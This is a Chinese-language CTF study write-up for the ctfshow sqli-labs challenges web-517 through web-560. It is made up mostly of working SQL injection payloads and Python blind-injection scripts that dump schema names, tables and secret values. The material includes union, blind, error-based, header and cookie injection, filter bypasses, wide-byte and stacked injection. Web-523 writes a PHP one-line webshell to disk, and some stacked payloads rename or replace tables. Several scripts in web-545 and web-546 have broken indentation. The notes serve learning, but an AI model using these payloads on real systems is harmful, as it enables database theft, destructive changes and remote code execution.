---
title: ctfshow-sqli-labs
date: 2025-03-08 17:51:18
tags:
- sql注入
category:
- 学习笔记
---

# ctfshow-sqli-labs

## web-517 字符型注入

判断闭合类型

```
id=1 and 1=2--+	//成功回显、说明是字符型注入
id=1' and 1=2--+	//无回显，说明闭合成功，是单引号闭合
```

payload：

```
判断列数，测出有3列
id=1' order by 3--+

测试回显位，测得回显位是2,3
id=-1' union select 1,2,3--+

查看库名，得到库名'ctfshow'
id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+

查看表名，得到表名'flag'
id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow'--+

查看列名，得到列名'id,flag'
id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+

查看数据，得到flag
id=-1' union select 1,2,group_concat(id,'-',flag) from ctfshow.flag--+
```

---

## web-518 数字型注入

判断闭合类型

```
?id=1 and 1=2--+	//无回显
?id=1 and 1=1--+	//有回显
判断是数字型注入
```

payload：

将上题payload中的单引号闭合去掉即可

---

## web-519 字符型注入id=1')

')闭合

---

## web-520 字符型注入id=1")

")闭合

---

## web-521 布尔盲注id=1'

判断闭合类型

```
id=1' and 1=1--+	//有回显
id=1' and 1=2--+	//无回想
说明是单引号闭合，且只会回显you are in..。
所以可以使用布尔盲注
```

盲注脚本：

```
import requests

if __name__ == '__main__':
    url = 'http://6398c35d-03b5-43f2-8f62-4a82ae9777d9.challenge.ctf.show/?id='
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2

            # payload = f'1\' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,0)--+'
            # payload = f'1\' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,0)--+'
            # payload = f'1\' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagpuck"),{i},1))>{mid},1,0)--+'
            payload = f'1\' and if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),{i},1))>{mid},1,0)--+'

            r = requests.get(url=url + payload)
            if 'You are in' in r.text:
                low = mid + 1
            else:
                high = mid

        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

```

---

## web-522 布尔盲注id=1"

双引号闭合"，其他和上题一样，使用布尔盲注即可

---

## web-523 利用SQL中的into outfile 函数 id=1'))

首先测试闭合，测试出来是`'))`闭合，所以这里用布尔盲注也可以，但是这里提示我们使用写入文件的方式拿到flag。

payload：

```
//将表名写入到1.txt文件中，访问文件得到表名flagdk
?id=1')) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow' into outfile "/var/www/html/1.txt"--+

//将列名写入到2.txt下，访问文件得到列名
?id=1')) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flagdk' into outfile "/var/www/html/2.txt"--+

//将flag写入到3.txt，访问文件得到flag
?id=1')) union select 1,2,group_concat(flag43) from ctfshow.flagdk into outfile "/var/www/html/3.txt"--+

这题也可以在写入的文件里插入一句话木马，然后蚁剑连接得到flag
?id=1')) union select 1,2,'<?php @eval($_POST[1]);?>' into outfile 'D:\\SoftWare\\PHPstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php' --+
```

---

## web-524 布尔盲注

同上布尔盲注

---

## web-525 时间盲注id=1'

首先测试闭合类型，用了很多种测试发现回显都不变化，尝试一下时间盲注测试

```
id=1' and sleep(3)--+
```

发现页面3秒后才响应，所以这题是单引号注入，且能够时间盲注，使用时间盲注脚本

python脚本

```
import requests
import time
if __name__ == '__main__' :
    url = 'http://e8c67313-e60b-4134-a12c-c84afb13e1b3.challenge.ctf.show/?id='
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            payload = f'1\' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,sleep(1)) --+'
            #payload = f'1\' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,sleep(2)) --+'
            #payload = f'1\' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagugs"),{i},1))>{mid},1,sleep(2)) --+'
            #payload = f'1\' and if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),{i},1))>{mid},1,sleep(2)) --+'
            # print(payload)
            stime=time.time()
            r = requests.get(url=url + payload)
            if time.time()-stime<1:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)
```

---

## web-526 时间盲注id=1"

同样是时间盲注，就是换成了双引号闭合

---

## web-527 POST字符型注入username=1'

这里就到了POST注入了。

```
在username输入框中注入，也可以抓包在请求头中注入
1' union select 1,group_concat(schema_name)from information_schema.schemata#

1' union select 1,group_concat(table_name)from information_schema.tables where table_schema='ctfshow'#

1' union select 1,group_concat(column_name)from information_schema.columns where table_name='flagugsd'#

1' union select 1,group_concat(flag43s) from ctfshow.flagugsd#
```

---

## web-528 POST字符型注入username=1")

前面的步骤都一样，只是换成了")注入

```
1") union select 1,group_concat(flag43as) from ctfshow.flagugsds#
```

---

## web-529 报错注入username=1')

闭合错误时有语句错误回显，所以可以使用报错注入。

```
admin') and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))#

admin') and extractvalue(1,concat(0x7e,(select group_concat(flag4) from ctfshow.flag),0x7e))#

admin') and extractvalue(1,concat(0x7e,(select right(group_concat(flag4),20) from ctfshow.flag),0x7e))#

报错注入用or也可以，而且可以用()来绕过空格过滤
例如：
admin')or(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e)))#
```

---

## web-530 报错注入usrename=1"、布尔盲注

同样是报错注入，只是换成了"闭合，这题和上题都可以使用POST布尔盲注

POST布尔盲注脚本

```
import requests
import time
url="https://5bb66a59-8c81-497d-99f9-339726c2ffa1.challenge.ctf.show/"
flag=""
i=0
while True:
    low=32
    high=127
    i=i+1
    while low<high:
        mid=(low+high) // 2
        data={
            'uname':f'admin" and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,0)#',
            'passwd':'123'
        }
        response=requests.post(url=url,data=data)
        if response.text.find("flag.jpg")>0:
            low=mid+1
        else:
            high=mid
    if low != 32:
        flag+=chr(low)
    else:
        break
    print(flag)

```

---

## web-531 报错注入username=admin'

'闭合，其他如上

---

## web-532 报错注入username=admin")

")闭合，其他如上

---

## web-533 报错注入password=1'

在密码行进行报错注入

判断闭合:

无论密码如何设置都会显示成功所以只有当你成功闭合后面写上错误语句时才会报错否则不会报错

```
1' and updatexml(1,concat(0x7e,(select (table_name) from information_schema.tables where table_schema='ctfshow'),0x7e),1)--+

1' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='flag'),0x7e),1)--+

1' and updatexml(1,concat(0x7e,(select (flag4) from ctfshow.flag),0x7e),1)--+
1' and updatexml(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e),1)--+
```

## web-534 ua头注入

首先需要登录成功。

name：admin

password：admin

发现登录成功后会回显ua头

```
所以ua头注入

用hackbar

添加ua头先法送一次再用admin admin 登录你的ua头才是你自己定义的

或者是直接在bp上搞

User-Agent: 'or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),1)or'1' ='1
```

也可以使用python脚本

```
import requests

payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
# payload = 'group_concat(flag4) from ctfshow.flag';
#payload = 'right(flag4,20) from ctfshow.flag'

headers = {
    "User-Agent":f"'and extractvalue(1,concat(0x7e,(select {payload}),0x7e)) and '1'='1",
}
data = {
    'uname':'admin',
    'passwd':'admin'
}
url = 'http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/'
r = requests.post(url, headers=headers, data=data)
print(r.text)

```

---

## web-535 referer注入

首先需要登录成功。

name：admin

password：admin

然后发现登录成功的界面会回显referer头信息

```
所以这里可以使用referer注入

在hackbar或者bp抓包中测试闭合
' or '1'='1
假如说闭合错误的话会有报错

'or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),1)or'1' ='1
```

同样可以使用python脚本

```
import requests

payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
# payload = 'group_concat(flag4) from ctfshow.flag';
#payload = 'right(flag4,20) from ctfshow.flag'

headers = {
    "Referer":f"'and extractvalue(1,concat(0x7e,(select {payload}),0x7e)) and '1'='1",
}
data = {
    'uname':'admin',
    'passwd':'admin'
}
url = 'http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/'
r = requests.post(url, headers=headers, data=data)
print(r.text)
```

---

## web-536 cookie注入、uname=admin'

首先需要登录成功。

name：admin

password：admin

然后登录成功后发现会回显cookie信息

```
先登录然后抓包，或者hackbar修改cookie
在uname=admin后添加payload

Cookie：uname=admin'or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),32)or'1' ='1
```

python脚本也行。

```
import requests

payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
# payload = 'group_concat(flag4) from ctfshow.flag';
#payload = 'right(flag4,20) from ctfshow.flag'

headers = {
    "Cookie":f"uname=admin'or extractvalue(1,concat(0x7e,(select {payload}),0x7e)) and '1'='1",
}
data = {
    'uname':'admin',
    'passwd':'admin'
}
url = 'http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/'
r = requests.post(url, headers=headers, data=data)
print(r.text)
```

---

## web-537 Cookie注入、base64加密、uname=')

用简单命令先测试闭合方式

```
多了个base64

加密

进行加密即可
') union select 1,group_concat(flag4),3 from ctfshow.flag #

base64编码:
JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KGZsYWc0KSwzIGZyb20gY3Rmc2hvdy5mbGFnICM=
```

---

## web-538 uname="

其他和上一题一样，双引号"闭合

---

## web-539 ;%00注释符过滤绕过

一:

可以看到后端对–+和#都进行了过滤，所以我们用url结束符： **;%00**

二:

```
我们可以

•1. ?id=1 返回正常

•2. ?id=1' 返回异常，说明可能存在漏洞

•3. ?id=1' --+ 或者?id=1' # 均返回错误，通过源代码分析，我们得知--+ # 都被替换为了空格，这里使用 ;%00充当注释符

•4.?id=1' order by 3 ;%00 查多少列

•5. ?id=-1' union select 1,2,3 ;%00 查找回显位置

•6. ?id=-1' union select 1,2, group_concat(schema_name) from information_schema.schemata ;%00 查库名

•7. ?id=-1' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479 ;%00 查表名

•8. ?id=-1' union select 1,2, group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 ;%00 查字段名

•9. ?id=-1' union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users ;%00 查出字段中所有的值

也可以不用报错注入

但是前面的id应等与一个不纯在的数

也可以报错注入

?id=1'and updatexml(1,concat(0x7e,right((select group_concat(flag4)from ctfshow.flag),20),0x7e),1);%00
因为只能回显32个字符，所以使用right函数控制字符串回显
```

---

## web-540 二次注入

当你创建一个admin'#的用户并登录后改变他的密码

回来登录发现admin的密码也被改变了

这样就可以确定SQL语句为 ' 闭合

若是未改变则不是 ' 闭合

原理：

**Sql 语句变为 UPDATE users SET passwd="New_Pass" WHERE username ='** 

**admin' # ' AND**

**password=' ， 也 就 是 执 行 了 UPDATE users SET passwd="New_Pass" WHERE username ='** 

**admin'** 

```
创建一个admin'#用户，密码设为123456
然后修改密码
改为123，
然后我们就能登录admin用户了，密码被我们改成了123
```

---

## web-541 or、and双写绕过、id=1'

过滤了or和and可以使用双写绕过

```
?id=1' aandnd updatexml(1,concat(0x7e,right((select group_concat(flag4s)from ctfshow.flags),20),0x7e),1)--+
```

也可以使用||来代替and或or

```
id=1' || updatexml(1,concat(0x7e,right((select group_concat(flag4s)from ctfshow.flags),20),0x7e),1)--+
```

---

## web-542 无列名注入 id=1、innodb

[SQL注入之 无列名注入 原理详解](https://blog.csdn.net/qq_66013948/article/details/136424994)

```
默认数据库mysql查询+无列名注入

判断闭合方式。
?id=1 正常回显

?id=1%23 正常回显

说明不需要闭合

注入方式尝试
先尝试下union联合查询：

?id=-1 union select 1,2,3%23

页面成功回显，说明存在联合查询注入点

绕过过滤
尝试获取数据库信息

?id=-1 union select 1,(SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA),3%23

页面回显报错，说明大概率存在过滤，过滤information_schema相关内容

这时使用默认的数据库mysql

获取所有数据库信息

?id=-1 union select 1,(select group_concat(database_name) from mysql.innodb_table_stats),3%23

获取数据库中数据表信息

?id=-1 union select 1,(select table_name from mysql.innodb_table_stats where database_name='ctfshow'),3%23

无列名注入获取flag

?id=-1 union select 1,group_concat(b),3 from (select 1,2 as b union select * from ctfshow.flags limit 1,1)a --+
```

---

## web-543 空格过滤绕过、or替换、;%00sql结束符

过滤了空格

对于空格，有较多的方法：

%09 TAB 键（水平）

%0a 新建一行%0a (后面的空格不能省)

%0c 新的一页

%0d return 功能

%0b TAB 键（垂直）

%a0 空格

但是都不行所以:

```
or替换+空格过滤绕过+sql结束字符过滤

确定闭合方式
?di=1 正常回显

?id=1' 回显异常，报错信息

?id=1'%23 报错 后面有''1'' LIMIT 0,1'，说明%23闭合失败，可能被过滤，使用“;%00”替代

?id=1';%00 回显正常，这里确定为单引号闭合

注入方式尝试
括号和注释符被过滤，union联合查询不容易使用括号过滤，考虑到页面回显报错，使用报错注入试试

?id=100'(or)updatexml(1,concat(0x7e,(select(database())),0x7e),1);%00

页面提示：()updatexml(1,concat(0x7e,(select(database())),0x7e),1);

提示表明，“or”没显示，表名“or”被替换，那么使用“||”替代

?id=100'||updatexml(1,concat(0x7e,(select(group_concat(database_name))from(mysql.innodb_table_stats)),0x7e),1);%00

?id=100'||updatexml(1,concat(0x7e,(select(table_name)from(mysql.innodb_table_stats)where(database_name)='ctfshow'),0x7e),1);%00

?id=100'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='flags'),0x7e),1);%00

?id=100'||updatexml(1,concat(0x7e,right((select(flag4s)from(ctfshow.flags)),32),0x7e),1);%00

?id=100'||updatexml(1,concat(0x7e,right((select(flag4s)from(ctfshow.flags)),32),0x7e),1);%00
```

---

## web-544 绕过过滤、布尔盲注

既不显示报错信息又过滤了空格

id=1成功

id=1'报错

id=1';%00还报错则不是'闭合

id=1')报错

id=1');%00成功则是')闭合

1. 经过测试，过滤的字符有：

- - - \ / -- --+ /**/ %23 and or

```
import requests

url = "http://795d93a2-1df8-46f4-b6ae-c1bbb84c1157.challenge.ctf.show/?id=100')"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0);%00'
        # payload = f'||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0);%00'
        # payload = f'||if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0);%00'
        r = requests.get(url+payload)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
```

---

## web-545 大小写混合绕过、%0a绕过、;%00sql结束符、id=100'

用%0a即可绕过

```
id=100'%0auNIon%0asElEct%0a1,2,group_concat(table_name)from%0ainformation_schema.tables%0awhere%0a table_schema='ctfshow'%0a ;%00

id=100'%0auNIon%0asElEct%0a1,2,group_concat(column_name)from%0ainformation_schema.columns%0awhere%0a table_name='flags'%0a ;%00

?id=100'%0auNIon%0asElEct%0a1,2,concat(id,'-',flag4s)from%0actfshow.flags%0a ;%00
```

也可以盲注

过滤了select

select大小写混合

```
import requests

url = "http://857803fc-3f61-4ec6-8084-214ad94d5be4.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127
while head < tail:
    mid = (head + tail) >> 1
    # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
    # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
    payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)%23'
    data = {
        'id': f"100'||{payload}||'0"
    }
    r = requests.get(url,params=data)
    if "Dumb" in r.text:
        head = mid + 1
    else:
        tail = mid

if head != 32:
    result += chr(head)
else:
    break
print(result)

```

---

## web-546 id=100"、其他同上

就换了个闭合，其他一样

```
?id=111"%0auNIon%0asElEct%0a  1,2,group_concat(table_name)from%0ainformation_schema.tables%0awhere%0a  table_schema='ctfshow'%0a ;%00

id=111"%0auNIon%0asElEct%0a    1,2,group_concat(flag4s)from%0actfshow.flags%0a ;%00
```

python脚本

```
import requests

url = "http://642ba949-092a-4d73-bdc6-3914a631fdf0.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127
while head < tail:
    mid = (head + tail) >> 1
    # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
    # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
    payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)%23'
    data = {
        'id': f'100"||{payload}||"0'
    }
    r = requests.get(url,params=data)
    if "Dumb" in r.text:
        head = mid + 1
    else:
        tail = mid

if head != 32:
    result += chr(head)
else:
    break
print(result)

```

---

## web-547 大小写混合绕过、复写绕过

过滤的有点奇怪多进行尝试

```
?id=111')%0aunion%0auNIon%0asElEctselect%0a  1,2,group_concat(table_name)from%0ainformation_schema.tables%0awhere%0a  table_schema='ctfshow'%0a ;%00

?id=111')%0aunion%0auNIon%0asElEctselect%0a  1,2,group_concat(column_name)from%0ainformation_schema.columns%0awhere%0a  table_name='flags'%0a ;%00

?id=111')%0aunion%0auNIon%0asElEctselect%0a  1,2,group_concat(flag4s)from%0actfshow.flags%0a ;%00

```

---

## web-548 同上

和上题一模一样

---

## web-549 代码逻辑漏洞导致的重复参数注入

思路（代码逻辑漏洞导致的重复参数注入）：

二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。

根据源代码，get提交的参数，如果重名，则以最后一个为准，所以sql语句在接受相同参数时候接受的是后面的参数值。
但是验证id是否是数字却只是验证了第一个id参数

其实第29关（web549）是用jsp搭建的服务器，所以建议在电脑中安装Jspstudy来安装Jsp的环境。

构造两个id参数，index.php?id=1&id=2，Apache PHP 会解析最后一个参数，Tomcat JSP 会解析第一个参数

```
?id=1&id=0'union select 1,2,group_concat(flag4s)from ctfshow.flags;%00
```

---

## web-550 id=0" 代码逻辑漏洞导致的重复参数注入

"闭合其他和上题一样

```
?id=1&id=0"union select 1,2,group_concat(flag4s)from ctfshow.flags;%00
```

---

## web-551 id=0") 代码逻辑漏洞导致的重复参数注入

")闭合其他和上题一样

```
?id=1&id=0")union select 1,2,group_concat(flag4s)from ctfshow.flags;%00
```

---

## web-552 宽字节注入、无列名注入

通过测试发现1'会被转化为1\\'

**这里利用了宽字节注入**

GBK 是占两个字节（也就是名叫宽字节，只要字节大于1的都是）

“ \ ”即url里面的“ %5c ”

我们在前面加上一个%df让他跟%5c组成%df%5c变成**縗**

不只是能和%df组合 组合后ascill大于128就可以

1. GBK首字节对应0x81-0xfe(129-239),尾字节对应0x40-0xfe(64-126)(除了0x7f【128】)

比如一些 %df’ %81’ %82’ %de’ 等等

```
查库

?id=0%df%27union select 1,2,group_concat(schema_name) from information_schema.schemata;%00
查表时没法用where table_schema='ctfshow'里面有'而且不知为何不能用宽字节注入

所以就查出所有的表

?id=0%df%27union select 1,2,group_concat(table_name) from information_schema.tables;%00
之后就是有库名有表名

进行无列名注入
?id=0%df%27union select 1,group_concat(b),3 from (select 1,2 as b union select * from ctfshow.flags limit 1,1)a;%00
```

---

## web-553 宽字节注入

和上题一样就是不能用;%00进行闭合了可以改用--+

```
?id=0%df%27union select 1,group_concat(b),3 from (select 1,2 as b union select * from ctfshow.flags limit 1,1)a--+
```

---

## web-554 POST宽字节注入

因为会把%也给\了所以要在bp上操作

国光大佬还写了一个新方法：

将 utf-8 转换为 utf-16 或 utf-32，例如将 ' 转为 utf-16 为�，从而得到了一个能被utf-8解析
为汉字的字节。
我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：

➜ ~ echo '|iconv -f utf-8 -t utf-16
��'
➜ ~ echo '|iconv -f utf-8 -t utf-32
��'

uname=-1�'union select 1,(select group_concat(flag4s) from ctfshow.flags)--+&passwd=1&submit=Submit

---

## web-555 无列名注入 id=0

数字型注入其他和上一题一样

```
因为''被加了\所以无法使用where table_schema='ctfshow'，只能查所有表名
?id=0 union select 1,2,group_concat(table_name) from information_schema.tables;--+

列名一样

?id=0 union select 1,2,group_concat(b)from (select 1,2 as b union select * from ctfshow.flags)a--+
```

---

## web-556 同上

和上面的题重复了

?id=0%df' union select 1,2,group_concat(b)from (select 1,2 as b union select * from ctfshow.flags)a--+

---

## web-557 POST宽字节注入、union无列名注入

bp post传

```
uname=admin%df'union select 1,group_concat(b)from (select 1,2 as b union select * from ctfshow.flags)a--+&passwd=admin&submit=Submit
```

---

## web-558 堆叠注入

**堆叠注入：**

MySQL 的命令行中，每一条语句以 `;` 结尾，这代表语句的结束，如果在注入过程中在 `;` 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。

局限性

1. 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。
2. 在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略

这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等

```
?id=1';CREATE TABLE flags SELECT * FROM ctfshow.flags;rename table users to a;rename table flags to users;
```

创建一个名为"flags"的新表，通过选择来自"ctfshow"模式的"flags"表中的所有列和行。接下来，你尝试将名为"users"的表重命名为"a"，然后将名为"flags"的表重命名为"users"。

再查询id=1即可

还有一种方法

```
insert into users(id,username,password) values (77,(select group_concat(flag4s) from ctfshow.flags),"don77")-- +
```

这个SQL查询是在尝试向`users`表中插入一行数据。具体来说，它试图将`id`设置为`77`，`username`设置为从`ctfshow.flags`表中的`flag4s`列获取的所有值连接在一起（使用`group_concat`函数），`password`设置为`"don77"`。

但是直接插入数据，flag会写入字段里面数据库列长度不一定满足回显长度需求所以截取试试。

```
?id=-1';insert into users(id,username,password) values (77,(select SUBSTRING(group_concat(flag4s),1,5) from ctfshow.flags),"don77")--+
```

联合注入也可以

```
'闭合
?id=0'union select 1,2,group_concat(flag4s)from ctfshow.flags--+
```

---

## web-559 堆叠注入 、id=1

堆叠注入

参考558

数字型

```
?id=1;CREATE TABLE flags SELECT * FROM ctfshow.flags;rename table users to a;rename table flags to users;

或:

?id=0 union select 1,2,group_concat(flag4s)from ctfshow.flags--+
```

---

## web-560 堆叠注入、id=1')

堆叠注入

参考558

')闭合

```
?id=1');CREATE TABLE flags SELECT * FROM ctfshow.flags;rename table users to a;rename table flags to users;

或:

?id=0')union select 1,2,group_concat(flag4s)from ctfshow.flags--+
```

